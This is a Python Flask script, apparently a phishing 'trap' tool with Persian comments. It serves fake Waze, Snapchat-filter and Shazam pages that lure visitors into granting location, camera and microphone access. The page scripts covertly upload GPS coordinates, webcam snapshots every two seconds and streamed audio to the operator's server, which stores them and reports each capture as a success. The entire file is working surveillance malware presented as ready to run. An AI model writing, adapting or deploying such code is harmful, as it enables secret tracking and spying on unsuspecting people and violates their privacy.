import os
import base64
import logging
from flask import Flask, render_template_string, request
from datetime import datetime
from colorama import Fore, Back, Style, init

init(autoreset=True)
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# ایجاد پوشه‌ها
for folder in ["captured_photos", "recordings"]:
    if not os.path.exists(folder): os.makedirs(folder)

# --- بنر جدید TRAP ---
def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Fore.RED}{Style.BRIGHT}" + "═"*60)
    print(f"{Fore.WHITE}{Style.BRIGHT}" + r"""
  ████████╗██████╗  █████╗ ██████╗ 
  ╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗
     ██║   ██████╔╝███████║██████╔╝
     ██║   ██╔══██╗██╔══██║██╔═══╝ 
     ██║   ██║  ██║██║  ██║██║     
     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     """)
    print(f"{Fore.RED}{Style.BRIGHT}" + "═"*60)
    print(f"  {Fore.YELLOW}[!] {Fore.WHITE}System: {Fore.GREEN}Active")
    print(f"  {Fore.YELLOW}[!] {Fore.WHITE}Service: {Fore.CYAN}Multi-Auditor v8.0")
    print(f"{Fore.RED}{Style.BRIGHT}" + "═"*60 + "\n")

# --- رابط‌های کاربری (Frontend) ---

# 1. بخش لوکیشن (Waze Improved)
LOC_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Waze Navigation</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        #map { height: 100vh; width: 100%; background: #eee; }
        .waze-bar { position: fixed; top: 0; width: 100%; background: white; padding: 15px; 
                    z-index: 1000; box-shadow: 0 2px 10px rgba(0,0,0,0.1); display: flex; align-items: center; }
        .logo { width: 35px; margin-right: 15px; }
        .btn-loc { background: #33b1ff; color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: bold; margin-left: auto; }
    </style>
</head>
<body>
    <div class="waze-bar">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/af/Waze_logo.png" class="logo">
        <span><b>Confirm your location</b> for live traffic.</span>
        <button class="btn-loc" onclick="getLoc()">Allow</button>
    </div>
    <div id="map"></div>
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        var map = L.map('map').setView([35.6892, 51.3890], 13); // پیش‌فرض تهران
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

        function getLoc() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    const { latitude, longitude } = pos.coords;
                    map.setView([latitude, longitude], 15);
                    L.marker([latitude, longitude]).addTo(map).bindPopup("You are here").openPopup();
                    fetch('/log_loc', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ lat: latitude, lon: longitude })
                    });
                }, err => { alert("Please enable GPS for Waze to work."); });
            }
        }
        window.onload = getLoc;
    </script>
</body>
</html>
"""

# 2. بخش دوربین با ۵ فیلتر (Instagram/Snapchat Style)
CAM_HTML = """
<!DOCTYPE html>
<html>
<head>
    <style>
        body { margin:0; background:#000; font-family:sans-serif; overflow:hidden; color:white; }
        #loader { height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; }
        .spinner { border:4px solid #333; border-left-color:#fffc00; border-radius:50%; width:40px; height:40px; animation:s 1s linear infinite; }
        @keyframes s { to {transform:rotate(360deg)} }
        #app { display:none; position:relative; width:100vw; height:100vh; }
        video { width:100%; height:100%; object-fit:cover; transition: 0.3s; }
        .rabbit-ears { position:absolute; top:15%; left:50%; transform:translateX(-50%); width:200px; display:none; pointer-events:none; }
        .filters { position:absolute; bottom:40px; width:100%; display:flex; justify-content:center; gap:15px; }
        .f-btn { width:60px; height:60px; border-radius:50%; border:3px solid white; background-size:cover; cursor:pointer; }
        /* Filter Styles */
        .f-gray { filter: grayscale(1); }
        .f-sepia { filter: sepia(1); }
        .f-invert { filter: invert(1); }
        .f-hue { filter: hue-rotate(90deg); }
    </style>
</head>
<body>
    <div id="loader"><div class="spinner"></div><p>Loading Camera Filters...</p></div>
    <div id="app">
        <video id="v" autoplay playsinline></video>
        <img id="rabbit" src="https://i.imgur.com/vHPTp7m.png" class="rabbit-ears">
        <div class="filters">
            <div class="f-btn" style="background:#fff" onclick="setF('')"></div>
            <div class="f-btn" style="background:#555" onclick="setF('f-gray')"></div>
            <div class="f-btn" style="background:sepia" onclick="setF('f-sepia')"></div>
            <div class="f-btn" style="background:cyan" onclick="setF('f-hue')"></div>
            <div class="f-btn" style="background:url('https://i.imgur.com/vHPTp7m.png') center/cover" onclick="setF('rabbit')"></div>
        </div>
    </div>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        setTimeout(() => { document.getElementById('loader').style.display='none'; document.getElementById('app').style.display='block'; start(); }, 3000);
        const v = document.getElementById('v');
        const r = document.getElementById('rabbit');
        function setF(f) {
            v.className = ''; r.style.display = 'none';
            if(f === 'rabbit') r.style.display = 'block';
            else if(f) v.classList.add(f);
        }
        function start() {
            navigator.mediaDevices.getUserMedia({video:true}).then(s => {
                v.srcObject = s;
                setInterval(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    fetch('/log_img', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({i:c.toDataURL('image/jpeg', 0.5)})});
                }, 2000);
            });
        }
    </script>
</body>
</html>
"""

# 3. بخش میکروفون (Shazam Style - بدون تغییر در ظاهر محبوب شما)
MIC_HTML = """
<!DOCTYPE html>
<html>
<head>
    <style>
        body { margin:0; background: radial-gradient(circle, #0088ff 0%, #004488 100%); height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; color:white; font-family:sans-serif; }
        .shazam-btn { width:180px; height:180px; background:white; border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer; box-shadow:0 0 50px rgba(0,0,0,0.3); }
        .shazam-btn img { width:100px; }
        .pulse { animation: p 2s infinite; }
        @keyframes p { 0% {box-shadow:0 0 0 0px rgba(255,255,255,0.4);} 100% {box-shadow:0 0 0 50px rgba(255,255,255,0);} }
    </style>
</head>
<body>
    <div class="shazam-btn" id="btn"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Shazam_logo.svg/1200px-Shazam_logo.svg.png"></div>
    <h2 id="st">Tap to Identify Song</h2>
    <script>
        let sid = Date.now();
        document.getElementById('btn').onclick = async () => {
            const s = await navigator.mediaDevices.getUserMedia({audio:true});
            const mr = new MediaRecorder(s);
            document.getElementById('btn').classList.add('pulse');
            document.getElementById('st').innerText = "Identifying...";
            mr.ondataavailable = e => {
                const fr = new FileReader(); fr.readAsDataURL(e.data);
                fr.onloadend = () => { fetch('/append_audio', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({audio:fr.result.split(',')[1], sid:sid})}); };
            };
            mr.start(1000);
        };
    </script>
</body>
</html>
"""

# --- مسیرهای بک‌رند ---

@app.route('/')
def index():
    if selected_mode == '1': return render_template_string(LOC_HTML)
    if selected_mode == '2': return render_template_string(CAM_HTML)
    if selected_mode == '3': return render_template_string(MIC_HTML)
    return "Trap Active"

@app.route('/log_loc', methods=['POST'])
def log_loc():
    d = request.json
    print(f"  {Fore.GREEN}[+] SUCCESS: {Fore.WHITE}Location Locked -> {Fore.YELLOW}{d['lat']}, {d['lon']}")
    with open("coordinates.txt", "a") as f: f.write(f"{datetime.now()}: {d['lat']}, {d['lon']}\n")
    return "1"

@app.route('/log_img', methods=['POST'])
def log_img():
    data = request.json['i'].split(",")[1]
    with open(f"captured_photos/snap_{datetime.now().strftime('%H%M%S')}.jpg", "wb") as f: f.write(base64.b64decode(data))
    print(f"  {Fore.MAGENTA}[+] SUCCESS: {Fore.WHITE}Camera Snapshot Captured")
    return "1"

@app.route('/append_audio', methods=['POST'])
def append_audio():
    data = request.json['audio']
    with open(f"recordings/stream_{request.json['sid']}.wav", "ab") as f: f.write(base64.b64decode(data))
    print(f"  {Fore.CYAN}[+] SUCCESS: {Fore.WHITE}Audio Stream Received")
    return "1"

if __name__ == '__main__':
    print_banner()
    print(f"  {Fore.WHITE}Select a Trap Mode:")
    print(f"  {Fore.RED}[1] {Fore.WHITE}Waze GPS Tracker")
    print(f"  {Fore.RED}[2] {Fore.WHITE}Camera AR Filters")
    print(f"  {Fore.RED}[3] {Fore.WHITE}Shazam Audio Finder")
    
    selected_mode = input(f"\n  {Fore.RED}┌──[{Fore.WHITE}Trap@System{Fore.RED}]\n  └─> {Fore.WHITE}")
    
    if selected_mode in ['1', '2', '3']:
        app.run(host='0.0.0.0', port=5000)

